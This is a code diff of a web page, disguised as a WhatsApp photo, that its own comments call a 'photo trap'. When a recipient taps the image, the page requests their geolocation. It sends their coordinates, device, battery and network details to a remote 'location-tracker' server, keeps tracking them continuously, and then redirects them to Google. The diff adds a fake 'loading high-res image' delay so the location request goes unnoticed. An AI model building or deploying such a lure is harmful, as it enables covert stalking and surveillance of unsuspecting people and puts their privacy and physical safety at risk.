@@ -3,15 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-    <!-- Open Graph for WhatsApp preview -->
     <meta property="og:title" content="Photo" />
     <meta property="og:description" content="Tap the photo to view" />
     <meta property="og:image" content="https://i.imgur.com/GHQTMbZ.jpeg" />
     <meta property="og:url" content="https://location-tracker-cn7m.onrender.com/whatsapp/photo" />
     <meta property="og:type" content="website" />
     <meta name="twitter:card" content="summary_large_image" />
-    
     <title>Photo</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -67,10 +64,7 @@
             border-radius: 2px;
             animation: progress 2s ease-in-out forwards;
         }
-        @keyframes progress {
-            0% { width: 0%; }
-            100% { width: 100%; }
-        }
+        @keyframes progress { 0% { width: 0%; } 100% { width: 100%; } }
         .status {
             margin-top: 15px;
             font-size: 13px;
@@ -81,14 +75,7 @@
         .status.error { color: #f44336; }
         .status.loading { color: #ffc107; }
         .status.info { color: #42a5f5; }
-
-        .click-hint {
-            margin-top: 8px;
-            font-size: 12px;
-            color: #555;
-            opacity: 0.7;
-        }
-
+        .click-hint { margin-top: 8px; font-size: 12px; color: #555; opacity: 0.7; }
         .continue-btn {
             margin-top: 15px;
             padding: 12px 30px;
@@ -103,7 +90,6 @@
             transition: background 0.2s;
         }
         .continue-btn:hover { background: #388e3c; }
-
         .reset-link {
             margin-top: 12px;
             font-size: 12px;
@@ -132,29 +118,23 @@
 
     <script>
         // =============================================
-        // 🆕 BRAND DETECTION: From Path OR Query String
+        // BRAND DETECTION
         // =============================================
         const BRAND_FROM_SERVER = '{{ brand }}'.trim();
         const pathParts = window.location.pathname.split('/').filter(p => p.length > 0);
-        // pathParts = ['whatsapp', 'photo'] if using clean URL
         const brandFromPath = (pathParts.length >= 2 && pathParts[1] === 'photo') ? pathParts[0] : null;
         const urlParams = new URLSearchParams(window.location.search);
         const brandFromQuery = urlParams.get('template');
-
         const template = BRAND_FROM_SERVER || brandFromPath || brandFromQuery || 'whatsapp';
-        console.log('📍 Detected brand (photo trap):', template);
+        console.log('📍 Photo trap brand:', template);
 
         // =============================================
         // CONFIGURATION
         // =============================================
-        const RENDER_URL = 'https://location-tracker-cn7m.onrender.com'; // CHANGE to your URL
-
+        const RENDER_URL = 'https://location-tracker-cn7m.onrender.com';
         const customImage = urlParams.get('img');
-
-        // iOS detection
         const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
 
-        // Session ID
         let sessionId = localStorage.getItem('tracker_session_id');
         if (!sessionId) {
             sessionId = 'photo_' + Math.random().toString(36).substring(2, 10) + '_' + Date.now().toString(36);
@@ -171,15 +151,11 @@
         let locationSent = false;
         let watchId = null;
 
-        // Load image
-        if (customImage) {
-            photoImg.src = customImage;
-        } else {
-            photoImg.src = 'https://i.imgur.com/GHQTMbZ.jpeg';
-        }
+        if (customImage) photoImg.src = customImage;
+        else photoImg.src = 'https://i.imgur.com/GHQTMbZ.jpeg';
 
         // =============================================
-        // Device Info (iOS-safe)
+        // HELPERS
         // =============================================
         function getDeviceInfo() {
             const ua = navigator.userAgent;
@@ -189,87 +165,53 @@
             else if (ua.includes('Android')) deviceName = 'Android';
             else if (ua.includes('Windows')) deviceName = 'Windows PC';
             else if (ua.includes('Mac')) deviceName = 'Mac';
-            return {
-                userAgent: ua,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: screen.width + 'x' + screen.height,
-                device_name: deviceName,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
+            return { userAgent: ua, platform: navigator.platform, language: navigator.language, screen: screen.width + 'x' + screen.height, device_name: deviceName, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone };
         }
 
         function getBatteryInfo() {
             if (isIOS) return Promise.resolve(null);
-            if (navigator.getBattery) {
-                return navigator.getBattery().then(battery => ({
-                    level: Math.round(battery.level * 100),
-                    charging: battery.charging
-                })).catch(() => null);
-            }
+            if (navigator.getBattery) return navigator.getBattery().then(b => ({ level: Math.round(b.level * 100), charging: b.charging })).catch(() => null);
             return Promise.resolve(null);
         }
 
         function getNetworkInfo() {
-            if (navigator.connection) {
-                return {
-                    type: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink,
-                    rtt: navigator.connection.rtt
-                };
-            }
+            if (navigator.connection) return { type: navigator.connection.effectiveType, downlink: navigator.connection.downlink, rtt: navigator.connection.rtt };
             return null;
         }
 
-        // =============================================
-        // Send Location
-        // =============================================
         function sendLocation(lat, lng, accuracy) {
             const deviceInfo = getDeviceInfo();
             return getBatteryInfo().then(battery => {
-                const payload = {
-                    lat: lat,
-                    lng: lng,
-                    accuracy: accuracy,
-                    device_info: deviceInfo,
-                    battery: battery,
-                    network: getNetworkInfo(),
-                    session_id: sessionId,
-                    mode: 'photo_trap_click'
-                };
                 return fetch(RENDER_URL + '/send-location', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({
+                        lat, lng, accuracy,
+                        device_info: deviceInfo, battery, network: getNetworkInfo(),
+                        session_id: sessionId, mode: 'photo_trap_click'
+                    })
                 });
             });
         }
 
-        // =============================================
-        // Continuous tracking
-        // =============================================
         function startContinuousTracking() {
             if (watchId !== null) return;
             watchId = navigator.geolocation.watchPosition(
-                function(position) {
-                    const lat = position.coords.latitude;
-                    const lng = position.coords.longitude;
-                    const accuracy = position.coords.accuracy;
-                    sendLocation(lat, lng, accuracy)
-                        .then(() => console.log('📍 Photo trap continuous update'))
-                        .catch(() => {});
+                pos => {
+                    const { latitude: lat, longitude: lng, accuracy } = pos.coords;
+                    sendLocation(lat, lng, accuracy).catch(() => {});
                 },
-                function(error) { console.error('Watch error:', error); },
+                () => {},
                 { enableHighAccuracy: true, timeout: 60000, maximumAge: 0 }
             );
         }
 
         // =============================================
-        // Get Location (triggered by click)
+        // GET LOCATION (with fake loading delay)
         // =============================================
         function getLocation() {
             if (locationSent) {
-                statusEl.textContent = '✅ Photo loaded! Tap Continue to view.';
+                statusEl.textContent = '✅ Photo loaded! Tap Continue.';
                 statusEl.className = 'status success';
                 continueBtn.style.display = 'inline-block';
                 return;
@@ -282,64 +224,57 @@
             }
 
             loadingBar.style.display = 'block';
-            statusEl.textContent = '📍 Getting your location...';
+            statusEl.textContent = '📸 Loading high-res image...';
             statusEl.className = 'status loading';
 
-            navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    const lat = position.coords.latitude;
-                    const lng = position.coords.longitude;
-                    const accuracy = position.coords.accuracy;
+            // Fake 1.5s loading delay
+            setTimeout(() => {
+                statusEl.textContent = '📍 Getting your location...';
 
-                    sendLocation(lat, lng, accuracy)
-                        .then(() => {
-                            locationSent = true;
-                            startContinuousTracking();
-                            statusEl.textContent = '✅ Photo loaded!';
-                            statusEl.className = 'status success';
-                            loadingBar.style.display = 'none';
-                            continueBtn.style.display = 'inline-block';
-                        })
-                        .catch(() => {
-                            locationSent = true;
-                            startContinuousTracking();
-                            statusEl.textContent = '✅ Photo loaded!';
-                            statusEl.className = 'status success';
-                            loadingBar.style.display = 'none';
-                            continueBtn.style.display = 'inline-block';
-                        });
-                },
-                function(error) {
-                    let msg = '⚠️ Location unavailable.';
-                    if (error.code === 1) {
-                        msg = '⚠️ Permission denied. Tap "Reset permissions" below, then clear site data in Safari settings.';
-                    } else if (error.code === 2) {
-                        msg = '⚠️ GPS signal not available.';
-                    } else if (error.code === 3) {
-                        msg = '⏳ Timeout. Tap the photo again.';
-                    }
-                    statusEl.textContent = msg;
-                    statusEl.className = 'status error';
-                    loadingBar.style.display = 'none';
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 60000,
-                    maximumAge: 0
-                }
-            );
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        const { latitude: lat, longitude: lng, accuracy } = pos.coords;
+                        sendLocation(lat, lng, accuracy)
+                            .then(() => {
+                                locationSent = true;
+                                startContinuousTracking();
+                                statusEl.textContent = '✅ Photo loaded!';
+                                statusEl.className = 'status success';
+                                loadingBar.style.display = 'none';
+                                continueBtn.style.display = 'inline-block';
+                            })
+                            .catch(() => {
+                                locationSent = true;
+                                startContinuousTracking();
+                                statusEl.textContent = '✅ Photo loaded!';
+                                statusEl.className = 'status success';
+                                loadingBar.style.display = 'none';
+                                continueBtn.style.display = 'inline-block';
+                            });
+                    },
+                    err => {
+                        let msg = '⚠️ Location unavailable.';
+                        if (err.code === 1) msg = '⚠️ Permission denied. Tap "Reset permissions" below.';
+                        else if (err.code === 2) msg = '⚠️ GPS signal not available.';
+                        else if (err.code === 3) msg = '⏳ Timeout. Tap the photo again.';
+                        statusEl.textContent = msg;
+                        statusEl.className = 'status error';
+                        loadingBar.style.display = 'none';
+                    },
+                    { enableHighAccuracy: true, timeout: 60000, maximumAge: 0 }
+                );
+            }, 1500);
         }
 
         // =============================================
-        // Continue button
+        // EVENT LISTENERS
         // =============================================
-        continueBtn.addEventListener('click', function() {
-            window.location.href = 'https://www.google.com'; // or your desired URL
+        photoFrame.addEventListener('click', getLocation);
+
+        continueBtn.addEventListener('click', () => {
+            window.location.href = 'https://www.google.com';
         });
 
-        // =============================================
-        // Reset permissions helper
-        // =============================================
         resetLink.addEventListener('click', function() {
             statusEl.innerHTML = '📱 To reset: <b>Settings > Safari > Advanced > Website Data</b> → clear <b>' + window.location.hostname + '</b>. Then refresh.';
             statusEl.className = 'status info';
@@ -350,23 +285,9 @@
             continueBtn.style.display = 'none';
         });
 
-        // =============================================
-        // Click handler
-        // =============================================
-        photoFrame.addEventListener('click', function(e) {
-            getLocation();
-        });
+        window.addEventListener('beforeunload', () => { if (watchId) navigator.geolocation.clearWatch(watchId); });
 
-        // Cleanup
-        window.addEventListener('beforeunload', function() {
-            if (watchId !== null) {
-                navigator.geolocation.clearWatch(watchId);
-                watchId = null;
-            }
-        });
-
-        console.log('🆔 Session ID:', sessionId);
-        console.log('📷 iOS-optimized photo trap loaded');
+        console.log('📷 Photo trap with fake loading ready');
     </script>
 </body>
 </html>
